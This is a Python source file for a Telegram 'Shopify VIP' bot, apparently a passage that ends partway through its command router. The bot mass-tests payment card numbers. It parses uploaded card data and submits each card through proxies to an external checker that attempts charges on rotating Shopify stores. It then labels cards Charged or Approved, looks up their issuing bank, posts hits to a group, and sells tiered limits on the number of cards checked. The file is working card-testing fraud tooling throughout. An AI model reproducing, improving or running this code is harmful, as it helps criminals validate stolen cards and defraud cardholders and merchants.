# ==============================================================================
# 𝘚𝘎𝘎 - SHOPIFY VIP BOT PRODUCTION SYSTEM (PTB NATIVE STYLES + OMNI-GIF + LIVE STATUS)
# ==============================================================================
import asyncio, aiohttp, aiofiles, os, random, time, json, re, io, logging, sys
from datetime import datetime, timedelta
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import RetryAfter, Conflict

from database2 import (init_db, ensure_user, get_user_plan, set_user_plan, get_all_user_proxies, add_proxy_db, remove_proxy_by_index, clear_all_proxies, mark_user_joined)

logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger("ShopifyVIP")

# ----------------- CONFIG & GLOBALS -----------------
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808").split(",") if x.strip()]
JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
HITS_GROUP_ID = os.getenv("HITS_GROUP_ID", "0").strip()
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")
CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

WORKERS, DELAY, HIT_DELAY = 40, 2.0, 0.5
_SITE_ERRORS_COUNT, _MAX_SITE_ERRORS, _JOIN_CACHE, _MAINTENANCE_MODE = {}, 4, {}, False
bot_instance = None

# ====================== 250+ COUNTRIES FLAGS ALGORITHM ======================
ALL_COUNTRY_CODES = ["AD","AE","AF","AG","AI","AL","AM","AO","AQ","AR","AS","AT","AU","AW","AX","AZ","BA","BB","BD","BE","BF","BG","BH","BI","BJ","BL","BM","BN","BO","BQ","BR","BS","BT","BV","BW","BY","BZ","CA","CC","CD","CF","CG","CH","CI","CK","CL","CM","CN","CO","CR","CU","CV","CW","CX","CY","CZ","DE","DJ","DK","DM","DO","DZ","EC","EE","EG","EH","ER","ES","ET","FI","FJ","FK","FM","FO","FR","GA","GB","GD","GE","GF","GG","GH","GI","GL","GM","GN","GP","GQ","GR","GS","GT","GU","GW","GY","HK","HM","HN","HR","HT","HU","ID","IE","IL","IM","IN","IO","IQ","IR","IS","IT","JE","JM","JO","JP","KE","KG","KH","KI","KM","KN","KP","KR","KW","KY","KZ","LA","LB","LC","LI","LK","LR","LS","LT","LU","LV","LY","MA","MC","MD","ME","MF","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MR","MS","MT","MU","MV","MW","MX","MY","MZ","NA","NC","NE","NF","NG","NI","NL","NO","NP","NR","NU","NZ","OM","PA","PE","PF","PG","PH","PK","PL","PM","PN","PR","PS","PT","PW","PY","QA","RE","RO","RS","RU","RW","SA","SB","SC","SD","SE","SG","SH","SI","SJ","SK","SL","SM","SN","SO","SR","SS","ST","SV","SX","SY","SZ","TC","TD","TF","TG","TH","TJ","TK","TL","TM","TN","TO","TR","TT","TV","TW","TZ","UA","UG","UM","US","UY","UZ","VA","VC","VE","VG","VI","VN","VU","WF","WS","YE","YT","ZA","ZM","ZW"]
COUNTRY_FLAGS = {code: chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397) for code in ALL_COUNTRY_CODES}

def get_flag_emoji(country_code, fallback="🏳️"):
    if not country_code or len(country_code) != 2: return fallback
    c = country_code.upper()
    return COUNTRY_FLAGS.get(c, chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397) if c.isalpha() else fallback)

# ====================== 100% RELIABLE ANIME GIFs LIBRARY ======================
WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"
ACTIVATION_GIF = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJ4Zndqbm5qbm5qbm5qbm5qbm5qbm5qbm5qbm5qbm5qbm5qJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/6Z3D5t3vtZROjEdF2W/giphy.gif"

ANIME_GIFS = [
    "https://i.pinimg.com/originals/2b/86/df/2b86df5da8f6f0db5b3e10eb96eb384c.gif",
    "https://i.pinimg.com/originals/a1/38/53/a138531ccba628eec4c1d6ff1aeb8ee3.gif",
    "https://i.pinimg.com/originals/30/80/e5/3080e5e09ddb2fba9eb77da12b9728de.gif",
    "https://i.pinimg.com/originals/f3/77/85/f37785e5f52402120ea2163b2f909117.gif",
    "https://i.pinimg.com/originals/05/cf/81/05cf818f9780075485eb1cae32d56a70.gif",
    "https://i.pinimg.com/originals/82/10/7d/82107dce81e37bc62dc14e4b7858cfa5.gif",
    "https://i.pinimg.com/originals/7c/4f/94/7c4f94bf762391262d1645e905d6db87.gif",
    "https://i.pinimg.com/originals/60/c5/d1/60c5d18d4512e022f4ce8e7d7b0f2095.gif",
    "https://i.pinimg.com/originals/9f/8e/58/9f8e583c2718abda3ba058bb0e0e1eb8.gif",
    "https://i.pinimg.com/originals/5c/b6/c1/5cb6c139c1f60cae8be7ebbc789e5fc6.gif",
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif"
]

PLANS = {
    "plan1": {"name": "𝘊𝘰𝘳𝘦 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "𝘌𝘭𝘪𝘵𝘦 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "𝘙𝘰𝘰𝘵 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "𝘟-𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]
USER_LAST_REQ, ACTIVE_MTXT_PROCESSES, PENDING_FILES = {}, {}, {}

_system_locks = {}
def get_system_lock(name: str):
    if name not in _system_locks: _system_locks[name] = asyncio.Lock()
    return _system_locks[name]

# ----------------- MISSING CORE FUNCTIONS -----------------
def create_native_button(text, callback_data=None, url=None, style=None):
    if url: return InlineKeyboardButton(text, url=url)
    return InlineKeyboardButton(text, callback_data=callback_data)

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 50000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

async def load_keys():
    async with get_system_lock("keys"):
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r') as f:
                    c = await f.read()
                    if c: return json.loads(c)
            except: return {}
        return {}

async def save_keys(keys_data):
    async with get_system_lock("keys"):
        async with aiofiles.open(KEYS_FILE, 'w') as f:
            await f.write(json.dumps(keys_data, indent=4))

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling an update:", exc_info=context.error)

# ----------------- OMNI-GIF STYLING ENGINE -----------------
# 🚀 تم إزالة القيود (Locks) من هنا لجعل البوت يستجيب لأوامر /start بسرعة البرق
async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    target = update.callback_query.message if update.callback_query else update.message
    if not target: return None
    
    if use_gif or specific_gif:
        url = specific_gif or random.choice(ANIME_GIFS)
        try: 
            return await target.reply_animation(animation=url, caption=text, reply_markup=markup, parse_mode="HTML")
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
            return await target.reply_animation(animation=url, caption=text, reply_markup=markup, parse_mode="HTML")
        except Exception as e: 
            logger.error(f"Animation fallback triggered: {e}")
            pass
            
    try: 
        return await target.reply_text(text=text, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e: 
        logger.error(f"Text fallback failed: {e}")
        return None

async def styled_edit(msg, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    try:
        if msg.animation or msg.photo or msg.video or msg.document: 
            return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode="HTML")
        return await msg.edit_text(text=text, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)
    except RetryAfter as e: 
        await asyncio.sleep(e.retry_after + 1)
    except Exception as e: 
        logger.error(f"Edit failed: {e}")
        return None

async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    if use_gif or specific_gif:
        url = specific_gif or random.choice(ANIME_GIFS)
        try: 
            return await bot.send_animation(chat_id=chat_id, animation=url, caption=text, reply_markup=markup, parse_mode="HTML")
        except Exception as e: 
            logger.error(f"Animation fallback triggered: {e}")
            pass
            
    try: 
        return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e: 
        logger.error(f"Text send failed: {e}")
        return None

_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True, force_close=True)
        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30, connect=10, sock_read=15), connector=connector)
    return _USER_HTTP_SESSIONS[key]

async def cleanup_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except: pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        y = '20' + y if len(y) == 2 else y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy): h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

_CACHED_SITES = []
_LAST_SITES_FETCH = 0
async def get_github_sites():
    global _CACHED_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, headers=headers, timeout=10) as r:
                if r.status == 200:
                    _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                    _LAST_SITES_FETCH = now
    except: pass
    if not _CACHED_SITES and os.path.exists('sites.txt'):
        try:
            async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
        except: pass
    return _CACHED_SITES

def is_dead_site_error(err):
    if not err: return True
    return any(k in str(err).lower() for k in ('receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error'))

# ----------------- SECURITY & FORCE JOIN -----------------
async def is_user_joined(uid, bot):
    if JOIN_CHANNEL_ID in ["0", ""] and JOIN_GROUP_ID in ["0", ""]: return True
    for chat_id in [JOIN_CHANNEL_ID, JOIN_GROUP_ID]:
        if str(chat_id) in ["0", ""]: continue
        try:
            try: cid = int(chat_id)
            except: cid = str(chat_id)
            member = await bot.get_chat_member(chat_id=cid, user_id=uid)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception as e:
            logger.warning(f"Join Check Failed (Make sure Bot is Admin in Channel): {e}")
            return False 
    return True

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    if await is_user_joined(uid, context.bot):
        _JOIN_CACHE[uid] = now
        return True
        
    kb = []
    if JOIN_CHANNEL_LINK and str(JOIN_CHANNEL_ID) not in ["0", ""]: kb.append([create_native_button("📢 Join Channel", url=JOIN_CHANNEL_LINK)])
    if JOIN_GROUP_LINK and str(JOIN_GROUP_ID) not in ["0", ""]: kb.append([create_native_button("💬 Join Group", url=JOIN_GROUP_LINK)])
    if not kb: return True
    kb.append([create_native_button("✅ Verify", callback_data="check_joined")])
    
    # تم تصحيح الخطأ الإملائي في كلمة (then)
    await styled_reply(update, "⦗ 🛑 ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘋𝘦𝘯𝘪𝘦𝘥\n\n├ 𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘫𝘰𝘪𝘯 𝘰𝘶𝘳 𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴 𝘧𝘪𝘳𝘴𝘵.\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘫𝘰𝘪𝘯, 𝘵𝘩𝘦𝘯 𝘤𝘭𝘪𝘤𝘬 '𝘝𝘦𝘳𝘪𝘧𝘺'.", buttons=kb, use_gif=True)
    return False

# ----------------- CALLBACK HANDLERS -----------------
async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    cp = await get_user_plan(uid)
    t = f"⦗ 💎 ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
    for _, pi in PLANS.items():
        t += f"├ ⦗ 💎 ⦘ <code>{pi['name']}</code>\n│ ├ ⦗ ⏱ ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n│ ├ ⦗ 💳 ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n│ ╰ ⦗ 💲 ⦘ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
    t += f"╰ ⦗ 👤 ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [[create_native_button("Contact Owner", url="https://t.me/Dddadddyttt")], [create_native_button("Back", callback_data="back_start")]]
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    ap = "├" if uid in ADMIN_ID else "╰"
    ap_txt = f"\n\n╰ ⦗ 👑 ⦘ 𝘈𝘥𝘮𝘪𝘯 𝘗𝘢𝘯𝘦𝘭\n  ├ /gen [𝘗𝘭𝘢𝘯] [𝘕𝘶𝘮𝘣𝘦𝘳]\n  ├ /validate [𝘒𝘦𝘺]\n  ├ /users\n  ╰ /maint" if uid in ADMIN_ID else ""
    t = f"⦗ ⚡ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮\n\n├ ⦗ 💳 ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨\n│ ╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬\n\n├ ⦗ ⚙️ ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳\n│ ├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴\n│ ├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴\n│ ╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴\n\n{ap} ⦗ 👤 ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵\n  ├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦\n  ├ /redeem ⇾ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘒𝘦𝘺\n  ├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬\n  ╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴{ap_txt}\n\n⦗ 💎 ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"
    kb = [[create_native_button("View Plans", callback_data="show_plans")], [create_native_button("Channel", url=JOIN_CHANNEL_LINK), create_native_button("Group", url=JOIN_GROUP_LINK)]]
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid in ADMIN_ID: return await q.answer("✅ Admin Access", show_alert=True)
    if await is_user_joined(uid, context.bot):
        await mark_user_joined(uid)
        await q.answer("✅ Verified!", show_alert=True)
        try: await q.message.delete()
        except: pass
        await styled_send(context.bot, uid, "⦗ ⚡ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮\n╰ 𝘚𝘦𝘯𝘥 /start 𝘵𝘰 𝘷𝘪𝘦𝘸 𝘵𝘩𝘦 𝘮𝘦𝘯𝘶.", use_gif=True)
    else:
        await q.answer("❌ Not joined yet!", show_alert=True)

# ----------------- CHECKER CORE -----------------
async def get_bin_info(bin_code):
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}") as r:
                if r.status == 200:
                    d = await r.json()
                    return {"brand": d.get("brand", "-"), "type": d.get("type", "-"), "level": d.get("level", "-"), "bank": d.get("bank", "-"), "country": d.get("country_name", "-"), "country_code": d.get("country", ""), "flag": d.get("country_flag", "")}
    except: pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": ""}

async def check_card_api(card, site, proxy, session, gateway_name):
    try:
        if len(card.split('|')) != 4: return {'status': 'Dead', 'message': 'Invalid format', 'card': card}
        params = {'cc': card, 'site': site}
        if proxy: params['proxy'] = proxy if isinstance(proxy, str) else f"{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}" if proxy.get('username') else f"{proxy['ip']}:{proxy['port']}"
        async with session.get(CHECKER_API_URL, params=params) as resp:
            if resp.status != 200: return {'status': 'Site Error', 'message': f'Error {resp.status}', 'card': card, 'retry': True}
            try: rj = json.loads(await resp.text())
            except: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
            rm, pr, gt, st = rj.get('Response', ''), rj.get('Price', '-'), gateway_name or rj.get('Gate', 'Shopify'), rj.get('Status', '')
        if is_dead_site_error(rm): return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
        rl = str(rm).lower()
        if st == 'Charged' or 'order completed' in rl or '💎' in rm or 'thank you' in rl or 'payment successful' in rl: return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if 'cloudflare bypass failed' in rl: return {'status': 'Site Error', 'message': 'Cloudflare', 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
        if 'insufficient_funds' in rl or 'insufficient funds' in rl: return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if st == 'Approved' or any(k in rl for k in ['approved', 'success', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip']): return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'failed']): return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
        return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
    except: return {'status': 'Site Error', 'message': 'Connection dropped', 'card': card, 'retry': True}

async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
    lr = None; ap = list(proxies) if proxies else []
    for _ in range(max_retries):
        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
        if not acs: _SITE_ERRORS_COUNT.clear(); acs = sites
        s = random.choice(acs)
        p = random.choice(ap) if ap else None
        r = await check_card_api(card, s, p, session, gateway_name)
        if not r.get('retry'):
            if r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: _SITE_ERRORS_COUNT[s] = 0
            return r
        lr = r; await asyncio.sleep(DELAY)
    if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries', 'card': card, 'gateway': gateway_name, 'price': '-'}

def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    h = "🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺" if status == "Charged" else "⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘝𝘝" if status == "Approved" else "🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 𝘍𝘶𝘯𝘥𝘴" if status == "Insufficient" else "🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥"
    country_code = str(bi.get('country_code', '')).strip()
    flag = get_flag_emoji(country_code) if country_code else "🏳️"
    cd = f"{bi.get('country', '-')} {flag}"
    return f"⦗ {h} ⦘\n\n💳 𝘊𝘢𝘳𝘥 ⇾ <code>{card}</code>\n💬 𝘙𝘦𝘲𝘶𝘦𝘴𝘵 ⇾ <code>{response}</code>\n\n🌐 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gateway}</code>\n💲 𝘗𝘳𝘪𝘤𝘦 ⇾ <code>{ps}</code>\n\n🏦 𝘉𝘢𝘯𝘬 𝘐𝘯𝘧𝘰\n ├ 𝘉𝘢𝘯𝘬: <code>{bi.get('bank', '-')}</code>\n ├ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺: <code>{cd}</code>\n ├ 𝘉𝘳𝘢𝘯𝘥: <code>{bi.get('brand', '-')}</code>\n ╰ 𝘛𝘺𝘱𝘦: <code>{bi.get('type', '-')} - {bi.get('level', '-')}</code>\n\n⏱ 𝘛𝘰𝘰𝘬 ⇾ <code>{elapsed:.2f}s</code>"

async def _send_global_hit(status, gateway, message, price, uid, bot):
    try:
        if str(HITS_GROUP_ID) in ["0", ""]: return
        try: un = getattr(await bot.get_chat(uid), 'first_name', f"User {uid}")
        except: un = f"User {uid}"
        pn = (await get_user_plan(uid)).title() if await get_user_plan(uid) else "Free"
        ps = f"${str(price).replace('$', '')}" if price and str(price) != "-" else ""
        h = "🟢 𝘊𝘏𝘈𝘙𝘎𝘌𝘋 𝘚𝘜𝘊𝘊𝘌𝘚𝘚𝘍𝘜𝘓𝘓𝘠" if status == "Charged" else "🟡 𝘐𝘕𝘚𝘜𝘍𝘍𝘐𝘊𝘐𝘌𝘕𝘛 𝘍𝘜𝘕𝘋𝘚" if status == "Insufficient" else None
        if not h: return
        t = f"⦗ {h} ⦘\n\n├ 🌐 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gateway}</code> {ps}\n├ 💬 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ⇾ <code>{message}</code>\n╰ 👤 𝘜𝘴𝘦𝘳 ⇾ <a href='tg://user?id={uid}'>{un}</a> (<code>{pn}</code>)"
        await bot.send_message(HITS_GROUP_ID, t, parse_mode="HTML", disable_web_page_preview=True)
    except: pass

# ====================== CENTRALIZED CORE ROUTER ======================
async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    
    if not update.message: return
    uid = update.effective_user.id
    raw_text = update.message.text or update.message.caption or ""
    
    if not re.match(r'^[/.][a-zA-Z0-9]', raw_text):
        if update.message.document and update.message.document.mime_type.startswith('text/'):
            await auto_file_check_cmd(update, context)
        return

    tokens = raw_text.split()
    cmd = tokens[0][1:].lower().split('@')[0]
    args = tokens[1:]

    # تم تصحيح جميع الأخطاء الإملائية وتنظيف الحروف هنا
    if cmd in ["start", "cmds", "commands"]:
        if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await styled_reply(update, "⦗ 🛠️ ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦", use_gif=True)
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        ap = "├" if uid in ADMIN_ID else "╰"
        ap_txt = f"\n\n╰ ⦗ 👑 ⦘ 𝘈𝘥𝘮𝘪𝘯 𝘗𝘢𝘯𝘦𝘭\n  ├ /gen [𝘗𝘭𝘢𝘯] [𝘕𝘶𝘮𝘣𝘦𝘳]\n  ├ /validate [𝘒𝘦𝘺]\n  ├ /users\n  ╰ /maint" if uid in ADMIN_ID else ""
